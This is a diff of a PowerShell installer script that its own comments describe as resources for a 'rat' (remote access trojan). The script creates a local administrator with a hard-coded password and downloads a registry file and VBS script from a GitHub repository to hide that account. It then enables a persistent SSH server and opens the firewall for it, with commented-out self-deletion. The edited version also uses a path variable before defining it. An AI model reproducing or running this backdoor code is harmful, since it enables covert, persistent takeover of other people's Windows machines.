@@ -1,6 +1,14 @@
 #biulds resources for the  rat
 # created by Dark Lord
 
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "ERROR: Run PowerShell as Administrator!" -ForegroundColor Red
+    pause
+    exit
+}
+
+
+
 
 #random string for direcories
  function random_text {
@@ -10,38 +18,88 @@
 
 
 
-# 1. Define variables FIRST
+
+
+#create local admin for the rat 
+function create_account {
+    [CmdletBinding()] 
+    param (
+        [string] $uname,
+        [securestring] $password
+     )
+     begin {
+     }
+        process {
+            New-LocalUser "$uname" -password $password -FullName "$uname" -Description "Temporary local admin"
+            Write-Verbose "$uname local user crated" 
+            Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+            
+        }
+        end{  
+        }
+
+    }
+
+#create admin user
 $uname = random_text
 $password = (ConvertTo-SecureString "Rat@@123"-AsPlainText -Force)
-$wd = random_text
-$path = "$env:temp/$wd"  # Define BEFORE using it!
-$initial_dir = Get-Location
+create_account  -uname $uname -password $password
 
-# 2. Create admin user
-create_account -uname $uname -password $password
 
-# 3. Create working directory
-mkdir $path 
-cd $path 
 
-# 4. Download files to current directory
+#goto temp ,make working directory
+
+ mkdir $path 
+ cd $path 
+ 
+
+
+
+#registry  to hide local admin
 $reg_file = random_text
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg" -OutFile "$reg_file.reg"
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile "$reg_file.reg"
 
+
+
+
+#visual basic script to registry
 $vbs_file = random_text
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs" -OutFile "$vbs_file.vbs"
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
 
-# 5. Execute files properly
-Start-Process "reg.exe" -ArgumentList "import `"$reg_file.reg`""
-Start-Process "wscript.exe" -ArgumentList "`"$vbs_file.vbs`""
+#install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
 
-# 6. Enable SSH (fix firewall command)
+
+
+
+
+#varaibles
+
+$wd = random_text
+$path = "$env:temp/$wd"
+$initial_dir = Get-Location
+ 
+
+
+
+
+
+
+
+
+
+#enabling  the presistance ssh 
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
 Start-Service sshd 
-Set-Service -Name sshd -StartupType 'Automatic' 
-Get-NetFirewallRule -Name *ssh* | Set-NetFirewallRule -Enabled True
+Set-Service  -Name sshd -StartupType 'Automatic' 
+Get-NetFirewallRule -Name *ssh* -Enabled True
 
-# 7. Optional: Self delete
-# cd $initial_dir
-# del installer.ps1
+
+
+ #self delete
+ #cd $initial_dir
+ #del installer.ps1
+
+
+ 
 
